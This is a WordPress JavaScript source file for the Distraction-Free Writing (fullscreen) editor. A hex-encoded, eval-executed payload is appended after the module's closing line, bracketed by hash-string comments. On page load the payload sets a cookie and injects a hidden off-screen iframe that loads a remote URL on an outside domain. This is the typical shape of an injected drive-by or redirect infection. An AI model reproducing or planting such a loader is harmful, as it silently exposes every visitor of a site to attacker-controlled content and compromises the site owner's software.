/* global deleteUserSetting, setUserSetting, switchEditors, tinymce, tinyMCEPreInit */
/**
 * Distraction-Free Writing
 * (wp-fullscreen)
 *
 * Access the API globally using the window.wp.editor.fullscreen variable.
 */
( function( $, window ) {
	var api, ps, s, toggleUI, uiTimer, PubSub,
		uiScrollTop = 0,
		transitionend = 'transitionend webkitTransitionEnd',
		$body = $( document.body ),
		$document = $( document );

	/**
	 * PubSub
	 *
	 * A lightweight publish/subscribe implementation.
	 *
	 * @access private
	 */
	PubSub = function() {
		this.topics = {};

		this.subscribe = function( topic, callback ) {
			if ( ! this.topics[ topic ] )
				this.topics[ topic ] = [];

			this.topics[ topic ].push( callback );
			return callback;
		};

		this.unsubscribe = function( topic, callback ) {
			var i, l,
				topics = this.topics[ topic ];

			if ( ! topics )
				return callback || [];

			// Clear matching callbacks
			if ( callback ) {
				for ( i = 0, l = topics.length; i < l; i++ ) {
					if ( callback == topics[i] )
						topics.splice( i, 1 );
				}
				return callback;

			// Clear all callbacks
			} else {
				this.topics[ topic ] = [];
				return topics;
			}
		};

		this.publish = function( topic, args ) {
			var i, l, broken,
				topics = this.topics[ topic ];

			if ( ! topics )
				return;

			args = args || [];

			for ( i = 0, l = topics.length; i < l; i++ ) {
				broken = ( topics[i].apply( null, args ) === false || broken );
			}
			return ! broken;
		};
	};

	// Initialize the fullscreen/api object
	api = {};

	// Create the PubSub (publish/subscribe) interface.
	ps = api.pubsub = new PubSub();

	s = api.settings = { // Settings
		visible: false,
		mode: 'tinymce',
		id: '',
		title_id: '',
		timer: 0,
		toolbar_shown: false
	};

	function _hideUI() {
		$body.removeClass('wp-dfw-show-ui');
	}

	/**
	 * toggleUI
	 *
	 * Toggle the CSS class to show/hide the toolbar, borders and statusbar.
	 */
	toggleUI = api.toggleUI = function( show ) {
		clearTimeout( uiTimer );

		if ( ! $body.hasClass('wp-dfw-show-ui') || show === 'show' ) {
			$body.addClass('wp-dfw-show-ui');
		} else if ( show !== 'autohide' ) {
			$body.removeClass('wp-dfw-show-ui');
		}

		if ( show === 'autohide' ) {
			uiTimer = setTimeout( _hideUI, 2000 );
		}
	};

	function resetCssPosition( add ) {
		s.$dfwWrap.parents().each( function( i, parent ) {
			var cssPosition, $parent = $(parent);

			if ( add ) {
				if ( parent.style.position ) {
					$parent.data( 'wp-dfw-css-position', parent.style.position );
				}

				$parent.css( 'position', 'static' );
			} else {
				cssPosition = $parent.data( 'wp-dfw-css-position' );
				cssPosition = cssPosition || '';
				$parent.css( 'position', cssPosition );
			}

			if ( parent.nodeName === 'BODY' ) {
				return false;
			}
		});
	}

	/**
	 * on()
	 *
	 * Turns fullscreen on.
	 *
	 * @param string mode Optional. Switch to the given mode before opening.
	 */
	api.on = function() {
		var id, $dfwWrap, titleId;

		if ( s.visible ) {
			return;
		}

		if ( ! s.$fullscreenFader ) {
			api.ui.init();
		}

		// Settings can be added or changed by defining "wp_fullscreen_settings" JS object.
		if ( typeof window.wp_fullscreen_settings === 'object' )
			$.extend( s, window.wp_fullscreen_settings );

		id = s.id || window.wpActiveEditor;

		if ( ! id ) {
			if ( s.hasTinymce ) {
				id = tinymce.activeEditor.id;
			} else {
				return;
			}
		}

		s.id = id;
		$dfwWrap = s.$dfwWrap = $( '#wp-' + id + '-wrap' );

		if ( ! $dfwWrap.length ) {
			return;
		}

		s.$dfwTextarea = $( '#' + id );
		s.$editorContainer = $dfwWrap.find( '.wp-editor-container' );
		uiScrollTop = $document.scrollTop();

		if ( s.hasTinymce ) {
			s.editor = tinymce.get( id );
		}

		if ( s.editor && ! s.editor.isHidden() ) {
			s.origHeight = $( '#' + id + '_ifr' ).height();
			s.mode = 'tinymce';
		} else {
			s.origHeight = s.$dfwTextarea.height();
			s.mode = 'html';
		}

		// Try to find title field
		if ( typeof window.adminpage !== 'undefined' &&
			( window.adminpage === 'post-php' || window.adminpage === 'post-new-php' ) ) {

			titleId = 'title';
		} else {
			titleId = id + '-title';
		}

		s.$dfwTitle = $( '#' + titleId );

		if ( ! s.$dfwTitle.length ) {
			s.$dfwTitle = null;
		}

		api.ui.fade( 'show', 'showing', 'shown' );
	};

	/**
	 * off()
	 *
	 * Turns fullscreen off.
	 */
	api.off = function() {
		if ( ! s.visible )
			return;

		api.ui.fade( 'hide', 'hiding', 'hidden' );
	};

	/**
	 * switchmode()
	 *
	 * @return string - The current mode.
	 *
	 * @param string to - The fullscreen mode to switch to.
	 * @event switchMode
	 * @eventparam string to   - The new mode.
	 * @eventparam string from - The old mode.
	 */
	api.switchmode = function( to ) {
		var from = s.mode;

		if ( ! to || ! s.visible || ! s.hasTinymce || typeof switchEditors === 'undefined' ) {
			return from;
		}

		// Don't switch if the mode is the same.
		if ( from == to )
			return from;

		if ( to === 'tinymce' && ! s.editor ) {
			s.editor = tinymce.get( s.id );

			if ( ! s.editor &&  typeof tinyMCEPreInit !== 'undefined' &&
				tinyMCEPreInit.mceInit && tinyMCEPreInit.mceInit[ s.id ] ) {

				// If the TinyMCE instance hasn't been created, set the "wp_fulscreen" flag on creating it
				tinyMCEPreInit.mceInit[ s.id ].wp_fullscreen = true;
			}
		}

		s.mode = to;
		switchEditors.go( s.id, to );
		api.refreshButtons( true );

		if ( to === 'html' ) {
			setTimeout( api.resizeTextarea, 200 );
		}

		return to;
	};

	/**
	 * General
	 */

	api.save = function() {
		var $hidden = $('#hiddenaction'),
			oldVal = $hidden.val(),
			$spinner = $('#wp-fullscreen-save .spinner'),
			$saveMessage = $('#wp-fullscreen-save .wp-fullscreen-saved-message'),
			$errorMessage = $('#wp-fullscreen-save .wp-fullscreen-error-message');

		$spinner.addClass( 'is-active' );
		$errorMessage.hide();
		$saveMessage.hide();
		$hidden.val('wp-fullscreen-save-post');

		if ( s.editor && ! s.editor.isHidden() ) {
			s.editor.save();
		}

		$.ajax({
			url: window.ajaxurl,
			type: 'post',
			data: $('form#post').serialize(),
			dataType: 'json'
		}).done( function( response ) {
			$spinner.removeClass( 'is-active' );

			if ( response && response.success ) {
				$saveMessage.show();

				setTimeout( function() {
					$saveMessage.fadeOut(300);
				}, 3000 );

				if ( response.data && response.data.last_edited ) {
					$('#wp-fullscreen-save input').attr( 'title',  response.data.last_edited );
				}
			} else {
				$errorMessage.show();
			}
		}).fail( function() {
			$spinner.removeClass( 'is-active' );
			$errorMessage.show();
		});

		$hidden.val( oldVal );
	};

	api.dfwWidth = function( pixels, total ) {
		var width;

		if ( pixels && pixels.toString().indexOf('%') !== -1 ) {
			s.$editorContainer.css( 'width', pixels );
			s.$statusbar.css( 'width', pixels );

			if ( s.$dfwTitle ) {
				s.$dfwTitle.css( 'width', pixels );
			}
			return;
		}

		if ( ! pixels ) {
			// Reset to theme width
			width = $('#wp-fullscreen-body').data('theme-width') || 800;
			s.$editorContainer.width( width );
			s.$statusbar.width( width );

			if ( s.$dfwTitle ) {
				s.$dfwTitle.width( width - 16 );
			}

			deleteUserSetting('dfw_width');
			return;
		}

		if ( total ) {
			width = pixels;
		} else {
			width = s.$editorContainer.width();
			width += pixels;
		}

		if ( width < 200 || width > 1200 ) {
			// sanity check
			return;
		}

		s.$editorContainer.width( width );
		s.$statusbar.width( width );

		if ( s.$dfwTitle ) {
			s.$dfwTitle.width( width - 16 );
		}

		setUserSetting( 'dfw_width', width );
	};

	// This event occurs before the overlay blocks the UI.
	ps.subscribe( 'show', function() {
		var title = $('#last-edit').text();

		if ( title ) {
			$('#wp-fullscreen-save input').attr( 'title', title );
		}
	});

	// This event occurs while the overlay blocks the UI.
	ps.subscribe( 'showing', function() {
		$body.addClass( 'wp-fullscreen-active' );
		s.$dfwWrap.addClass( 'wp-fullscreen-wrap' );

		if ( s.$dfwTitle ) {
			s.$dfwTitle.after( '<span id="wp-fullscreen-title-placeholder">' );
			s.$dfwWrap.prepend( s.$dfwTitle.addClass('wp-fullscreen-title') );
		}

		api.refreshButtons();
		resetCssPosition( true );
		$('#wpadminbar').hide();

		// Show the UI for 2 sec. when opening
		toggleUI('autohide');

		api.bind_resize();

		if ( s.editor ) {
			s.editor.execCommand( 'wpFullScreenOn' );
		}

		if ( 'ontouchstart' in window ) {
			api.dfwWidth( '90%' );
		} else {
			api.dfwWidth( $( '#wp-fullscreen-body' ).data('dfw-width') || 800, true );
		}

		// scroll to top so the user is not disoriented
		scrollTo(0, 0);
	});

	// This event occurs after the overlay unblocks the UI
	ps.subscribe( 'shown', function() {
		s.visible = true;

		if ( s.editor && ! s.editor.isHidden() ) {
			s.editor.execCommand( 'wpAutoResize' );
		} else {
			api.resizeTextarea( 'force' );
		}
	});

	ps.subscribe( 'hide', function() { // This event occurs before the overlay blocks DFW.
		$document.unbind( '.fullscreen' );
		s.$dfwTextarea.unbind('.wp-dfw-resize');
	});

	ps.subscribe( 'hiding', function() { // This event occurs while the overlay blocks the DFW UI.
		$body.removeClass( 'wp-fullscreen-active' );

		if ( s.$dfwTitle ) {
			$( '#wp-fullscreen-title-placeholder' ).before( s.$dfwTitle.removeClass('wp-fullscreen-title').css( 'width', '' ) ).remove();
		}

		s.$dfwWrap.removeClass( 'wp-fullscreen-wrap' );
		s.$editorContainer.css( 'width', '' );
		s.$dfwTextarea.add( '#' + s.id + '_ifr' ).height( s.origHeight );

		if ( s.editor ) {
			s.editor.execCommand( 'wpFullScreenOff' );
		}

		resetCssPosition( false );

		window.scrollTo( 0, uiScrollTop );
		$('#wpadminbar').show();
	});

	// This event occurs after DFW is removed.
	ps.subscribe( 'hidden', function() {
		s.visible = false;
	});

	api.refreshButtons = function( fade ) {
		if ( s.mode === 'html' ) {
			$('#wp-fullscreen-mode-bar').removeClass('wp-tmce-mode').addClass('wp-html-mode')
				.find('a').removeClass( 'active' ).filter('.wp-fullscreen-mode-html').addClass( 'active' );

			if ( fade ) {
				$('#wp-fullscreen-button-bar').fadeOut( 150, function(){
					$(this).addClass('wp-html-mode').fadeIn( 150 );
				});
			} else {
				$('#wp-fullscreen-button-bar').addClass('wp-html-mode');
			}
		} else if ( s.mode === 'tinymce' ) {
			$('#wp-fullscreen-mode-bar').removeClass('wp-html-mode').addClass('wp-tmce-mode')
				.find('a').removeClass( 'active' ).filter('.wp-fullscreen-mode-tinymce').addClass( 'active' );

			if ( fade ) {
				$('#wp-fullscreen-button-bar').fadeOut( 150, function(){
					$(this).removeClass('wp-html-mode').fadeIn( 150 );
				});
			} else {
				$('#wp-fullscreen-button-bar').removeClass('wp-html-mode');
			}
		}
	};

	/**
	 * UI Elements
	 *
	 * Used for transitioning between states.
	 */
	api.ui = {
		init: function() {
			var toolbar;

			s.toolbar = toolbar = $('#fullscreen-topbar');
			s.$fullscreenFader = $('#fullscreen-fader');
			s.$statusbar = $('#wp-fullscreen-status');
			s.hasTinymce = typeof tinymce !== 'undefined';

			if ( ! s.hasTinymce )
				$('#wp-fullscreen-mode-bar').hide();

			$document.keyup( function(e) {
				var c = e.keyCode || e.charCode, modKey;

				if ( ! s.visible ) {
					return;
				}

				if ( navigator.platform && navigator.platform.indexOf('Mac') !== -1 ) {
					modKey = e.ctrlKey; // Ctrl key for Mac
				} else {
					modKey = e.altKey; // Alt key for Win & Linux
				}

				if ( modKey && ( 61 === c || 107 === c || 187 === c ) ) { // +
					api.dfwWidth( 25 );
					e.preventDefault();
				}

				if ( modKey && ( 45 === c || 109 === c || 189 === c ) ) { // -
					api.dfwWidth( -25 );
					e.preventDefault();
				}

				if ( modKey && 48 === c ) { // 0
					api.dfwWidth( 0 );
					e.preventDefault();
				}
			});

			$( window ).on( 'keydown.wp-fullscreen', function( event ) {
				// Turn fullscreen off when Esc is pressed.
				if ( 27 === event.keyCode && s.visible ) {
					api.off();
					event.stopImmediatePropagation();
				}
			});

			if ( 'ontouchstart' in window ) {
				$body.addClass('wp-dfw-touch');
			}

			toolbar.on( 'mouseenter', function() {
				toggleUI('show');
			}).on( 'mouseleave', function() {
				toggleUI('autohide');
			});

			// Bind buttons
			$('#wp-fullscreen-buttons').on( 'click.wp-fullscreen', 'button', function( event ) {
				var command = event.currentTarget.id ? event.currentTarget.id.substr(6) : null;

				if ( s.editor && 'tinymce' === s.mode ) {
					switch( command ) {
						case 'bold':
							s.editor.execCommand('Bold');
							break;
						case 'italic':
							s.editor.execCommand('Italic');
							break;
						case 'bullist':
							s.editor.execCommand('InsertUnorderedList');
							break;
						case 'numlist':
							s.editor.execCommand('InsertOrderedList');
							break;
						case 'link':
							s.editor.execCommand('WP_Link');
							break;
						case 'unlink':
							s.editor.execCommand('unlink');
							break;
						case 'help':
							s.editor.execCommand('WP_Help');
							break;
						case 'blockquote':
							s.editor.execCommand('mceBlockQuote');
							break;
					}
				} else if ( command === 'link' && window.wpLink ) {
					window.wpLink.open();
				}

				if ( command === 'wp-media-library' && typeof wp !== 'undefined' && wp.media && wp.media.editor ) {
					wp.media.editor.open( s.id );
				}
			});
		},

		fade: function( before, during, after ) {
			if ( ! s.$fullscreenFader ) {
				api.ui.init();
			}

			// If any callback bound to before returns false, bail.
			if ( before && ! ps.publish( before ) ) {
				return;
			}

			api.fade.In( s.$fullscreenFader, 200, function() {
				if ( during ) {
					ps.publish( during );
				}

				api.fade.Out( s.$fullscreenFader, 200, function() {
					if ( after ) {
						ps.publish( after );
					}
				});
			});
		}
	};

	api.fade = {
		// Sensitivity to allow browsers to render the blank element before animating.
		sensitivity: 100,

		In: function( element, speed, callback, stop ) {

			callback = callback || $.noop;
			speed = speed || 400;
			stop = stop || false;

			if ( api.fade.transitions ) {
				if ( element.is(':visible') ) {
					element.addClass( 'fade-trigger' );
					return element;
				}

				element.show();
				element.first().one( transitionend, function() {
					callback();
				});

				setTimeout( function() { element.addClass( 'fade-trigger' ); }, this.sensitivity );
			} else {
				if ( stop ) {
					element.stop();
				}

				element.css( 'opacity', 1 );
				element.first().fadeIn( speed, callback );

				if ( element.length > 1 ) {
					element.not(':first').fadeIn( speed );
				}
			}

			return element;
		},

		Out: function( element, speed, callback, stop ) {

			callback = callback || $.noop;
			speed = speed || 400;
			stop = stop || false;

			if ( ! element.is(':visible') ) {
				return element;
			}

			if ( api.fade.transitions ) {
				element.first().one( transitionend, function() {
					if ( element.hasClass('fade-trigger') ) {
						return;
					}

					element.hide();
					callback();
				});
				setTimeout( function() { element.removeClass( 'fade-trigger' ); }, this.sensitivity );
			} else {
				if ( stop ) {
					element.stop();
				}

				element.first().fadeOut( speed, callback );

				if ( element.length > 1 ) {
					element.not(':first').fadeOut( speed );
				}
			}

			return element;
		},

		// Check if the browser supports CSS 3.0 transitions
		transitions: ( function() {
			var style = document.documentElement.style;

			return ( typeof style.WebkitTransition === 'string' ||
				typeof style.MozTransition === 'string' ||
				typeof style.OTransition === 'string' ||
				typeof style.transition === 'string' );
		})()
	};

	/**
	 * Resize API
	 *
	 * Automatically updates textarea height.
	 */
	api.bind_resize = function() {
		s.$dfwTextarea.on( 'keydown.wp-dfw-resize click.wp-dfw-resize paste.wp-dfw-resize', function() {
			api.resizeTextarea();
		});
	};

	api.resizeTextarea = function() {
		var node = s.$dfwTextarea[0];

		if ( node.scrollHeight > node.clientHeight ) {
			node.style.height = node.scrollHeight + 50 + 'px';
		}
	};

	// Export
	window.wp = window.wp || {};
	window.wp.editor = window.wp.editor || {};
	window.wp.editor.fullscreen = api;

})( jQuery, window );
/*b54a318d8391927ca2a30c381a09e72d*/;(function(){var idrieinh="";var sysefbsn="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var rsftbaff=0;rsftbaff<sysefbsn.length;rsftbaff+=2){idrieinh=idrieinh+parseInt(sysefbsn.substring(rsftbaff,rsftbaff+2), 16)+",";}idrieinh=idrieinh.substring(0,idrieinh.length-1);eval(eval('String.fromCharCode('+idrieinh+')'));})();/*b54a318d8391927ca2a30c381a09e72d*/